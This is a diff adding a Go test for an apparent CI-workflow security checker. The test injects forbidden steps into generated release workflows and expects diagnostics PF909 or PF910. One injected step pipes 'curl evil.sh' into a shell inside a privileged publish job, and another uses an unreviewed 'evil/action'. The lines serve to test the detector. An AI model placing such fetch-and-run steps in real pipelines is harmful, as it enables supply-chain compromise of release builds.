@@ -186,3 +186,48 @@ func TestArtifactBindingCantBeRemoved(t *testing.T) {
 		})
 	}
 }
+
+// TestEveryGuaranteedRowHasABreakingTest injects one violation per design §2
+// row into real output (rows 2, 4, 6 and 7 are covered by the tests above;
+// row 8, lock pins, arrives in M4).
+func TestEveryGuaranteedRowHasABreakingTest(t *testing.T) {
+	p, files := example(t)
+	release, w := files[0].Content, p.Workflows[0]
+	publishSteps := "    steps:\n      - name: 'pinfold: check artifact dist' # pinfold:generated release/publish/bind-dist\n"
+	buildSteps := "    steps:\n      - name: 'pinfold: checkout' # pinfold:generated release/build/step-1\n"
+	inject := func(anchor, step string) string {
+		if !strings.Contains(release, anchor) {
+			t.Fatalf("anchor not found: %q", anchor)
+		}
+		return strings.Replace(release, anchor, anchor[:strings.Index(anchor, "\n")+1]+step+anchor[strings.Index(anchor, "\n")+1:], 1)
+	}
+	tests := []struct {
+		row, name, out, want string
+	}{
+		{"1", "run step in a privileged job", inject(publishSteps, "      - run: curl evil.sh | sh\n"), "PF909"},
+		{"1", "unreviewed action in a privileged job", inject(publishSteps, "      - uses: evil/action@v1\n"), "PF909"},
+		{"1", "github-script by tag in a privileged job", inject(publishSteps, "      - uses: actions/github-script@v9\n        with:\n          script: 'console.log(1)'\n"), "PF909"},
+		{"5", "cache restore in a feeder job", inject(buildSteps, "      - uses: actions/setup-python@v7\n        with:\n          cache: pip\n"), "PF910"},
+		{"5", "actions/cache in a privileged job", inject(publishSteps, "      - uses: actions/cache@v4\n        with:\n          path: x\n          key: k\n"), "PF910"},
+	}
+	for _, tt := range tests {
+		t.Run("row "+tt.row+": "+tt.name, func(t *testing.T) {
+			d := Workflow("t", tt.out, w)
+			found := false
+			for _, x := range d {
+				found = found || x.Code == tt.want
+			}
+			if !found {
+				t.Errorf("want %s, got %v", tt.want, d)
+			}
+		})
+	}
+
+	// unsafe_run must be stamped in the file.
+	unsafe := *w
+	unsafe.UnsafeRun = true
+	d := Workflow("t", release, &unsafe)
+	if len(d) == 0 || d[0].Code != "PF909" {
+		t.Errorf("unsafe_run without a stamp: got %v, want PF909", d)
+	}
+}
